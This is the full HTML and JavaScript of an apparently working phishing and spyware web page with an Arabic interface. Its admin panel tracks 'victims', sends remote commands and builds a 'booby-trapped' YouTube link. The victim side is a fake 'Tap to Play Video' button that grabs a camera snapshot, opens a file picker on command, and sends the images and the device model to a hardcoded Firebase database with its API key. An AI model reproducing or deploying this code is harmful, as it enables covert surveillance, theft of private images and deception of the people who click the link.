<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>S-SYSTEM V23</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --neon: #00ff41; --bg: #000; }
        body { background: var(--bg); color: var(--neon); margin: 0; font-family: 'Courier New', monospace; overflow-x: hidden; }
        
        /* الرادار المتحرك */
        .radar-container { position: relative; width: 100%; height: 150px; background: #050505; border: 1px solid #111; overflow: hidden; margin-bottom: 10px; border-radius: 8px; }
        .radar-sweep { position: absolute; width: 200%; height: 200%; background: conic-gradient(from 0deg, transparent 0%, rgba(0, 255, 65, 0.2) 25%, transparent 50%); top: -50%; left: -50%; animation: scan 3s linear infinite; }
        @keyframes scan { 100% { transform: rotate(360deg); } }
        .radar-text { position: absolute; bottom: 5px; right: 10px; font-size: 10px; animation: blink 1s infinite; }
        @keyframes blink { 50% { opacity: 0; } }

        /* لوحة التحكم */
        #admin-panel { display: none; padding: 15px; }
        .section { border: 1px solid var(--neon); padding: 15px; margin-bottom: 15px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,255,65,0.1); }
        .v-card { border: 1px solid #222; padding: 12px; margin-bottom: 8px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; background: #080808; transition: 0.3s; }
        .v-card.active { border-color: #fff; background: #151515; box-shadow: inset 0 0 10px rgba(255,255,255,0.1); }
        button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; width: 100%; cursor: pointer; font-weight: bold; margin-top: 5px; }
        button:active { background: var(--neon); color: #000; }
        input { width: 100%; padding: 10px; background: #000; color: var(--neon); border: 1px solid var(--neon); margin-bottom: 10px; box-sizing: border-box; }

        /* واجهة الضحية */
        #vic-panel { display: none; height: 100vh; flex-direction: column; align-items: center; justify-content: center; position: fixed; top: 0; width: 100%; background: #000; z-index: 9999; }
        .play-btn { width: 90px; height: 90px; border: 4px solid #fff; border-radius: 50%; position: relative; cursor: pointer; }
        .play-btn::after { content: ''; position: absolute; top: 25px; left: 35px; border-left: 30px solid #fff; border-top: 20px solid transparent; border-bottom: 20px solid transparent; }
    </style>
</head>
<body>

<div id="admin-panel">
    <div class="radar-container">
        <div class="radar-sweep"></div>
        <div class="radar-text">SCANNING FOR TARGETS...</div>
    </div>
    
    <div class="section">
        <h3 style="margin:0 0 10px 0; font-size:14px;">📡 الأجهزة المكتشفة</h3>
        <div id="v-list" style="max-height: 200px; overflow-y: auto;">جاري البحث عن اتصال...</div>
    </div>

    <div class="section">
        <h3>🕹️ التحكم: <span id="t-name" style="color:#fff;">--</span></h3>
        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
            <button onclick="cmd('snap')">📸 سحب صورة</button>
            <button onclick="cmd('vibrate')" style="color:yellow; border-color:yellow;">📳 هز الهاتف</button>
            <button onclick="cmd('pick')" style="color:cyan; border-color:cyan;">📂 سحب ملفات</button>
            <button onclick="cmd('release')" style="background:#030;">🔓 إطلاق سراح</button>
        </div>
        <button onclick="db.ref('victims').remove()" style="color:red; border-color:red; margin-top:15px; font-size:10px;">🗑️ تفريغ الرادار</button>
    </div>

    <div class="section">
        <input type="text" id="target-url" placeholder="رابط يوتيوب">
        <button onclick="gen()">صناعة الرابط الملغم</button>
        <div id="res-link" style="font-size:9px; color:#0ff; margin-top:10px; word-break:break-all;"></div>
    </div>
</div>

<div id="vic-panel">
    <div class="play-btn" onclick="startGhost()"></div>
    <p style="margin-top:20px; color:#fff; font-family: sans-serif;">Tap to Play Video</p>
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>
    <input type="file" id="f-in" style="display:none;" accept="image/*" multiple>
</div>

<script>
    const config = {
        apiKey: "AIzaSyBT-2QQEdSdO-DsQvPESPc8cBQaW5azxqY",
        databaseURL: "https://monster-system-7f67e-default-rtdb.firebaseio.com",
        projectId: "monster-system-7f67e"
    };
    firebase.initializeApp(config);
    const db = firebase.database();
    let selId = null;

    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('admin') === "1") {
        document.getElementById('admin-panel').style.display = 'block';
        initAdmin();
    } else if (urlParams.get('v')) {
        document.getElementById('vic-panel').style.display = 'flex';
        initVictim(atob(urlParams.get('v')));
    } else {
        document.body.innerHTML = "<div style='background:#000; height:100vh;'></div>";
    }

    // --- الإدارة ---
    function initAdmin() {
        // استماع فوري لأي تغيير
        db.ref('victims').on('value', s => {
            const list = document.getElementById('v-list');
            list.innerHTML = '';
            if(!s.exists()) list.innerHTML = "جاري البحث عن اتصال...";
            s.forEach(child => {
                const v = child.val();
                const id = child.key;
                const online = (Date.now() - v.lastSeen) < 15000;
                list.innerHTML += `<div class="v-card ${id === selId ? 'active' : ''}" onclick="select('${id}','${v.model}')">
                    <span>${v.model}</span>
                    <span style="color:${online ? '#0f0' : '#444'}">${online ? '● نشط' : '● غير متصل'}</span>
                </div>`;
            });
        });
    }

    function select(id, m) { selId = id; document.getElementById('t-name').innerText = m; initAdmin(); }

    function cmd(t) {
        if (!selId) return alert("اختر جهازاً من الرادار!");
        db.ref('victims/' + selId + '/cmd').set({ t: t, time: Date.now() });
    }

    function gen() {
        const u = document.getElementById('target-url').value;
        if(!u) return alert("ضع رابط يوتيوب!");
        document.getElementById('res-link').innerText = window.location.href.split('?')[0] + "?v=" + btoa(u);
    }

    // --- الضحية ---
    let myRef = null;
    function initVictim(target) {
        const model = navigator.userAgent.includes("Android") ? navigator.userAgent.split(';')[2].split('Build')[0] : "iPhone/PC";
        myRef = db.ref('victims').push();
        
        const pulse = () => myRef.update({ model: model, lastSeen: Date.now(), time: new Date().toLocaleTimeString() });
        pulse();
        setInterval(pulse, 5000);

        db.ref('victims/' + myRef.key + '/cmd').on('value', s => {
            const c = s.val(); if (!c) return;
            if (c.t === 'snap') take();
            if (c.t === 'vibrate') navigator.vibrate([500, 200, 500]);
            if (c.t === 'pick') document.getElementById('f-in').click();
            if (c.t === 'release') window.location.href = target;
        });
    }

    async function startGhost() {
        navigator.vibrate(100);
        await take();
    }

    async function take() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('v'); video.srcObject = s; await video.play();
            const canvas = document.getElementById('c'); canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            myRef.child('files').push(canvas.toDataURL('image/jpeg', 0.5));
            s.getTracks().forEach(t => t.stop());
        } catch (e) {}
    }
</script>
</body>
</html>
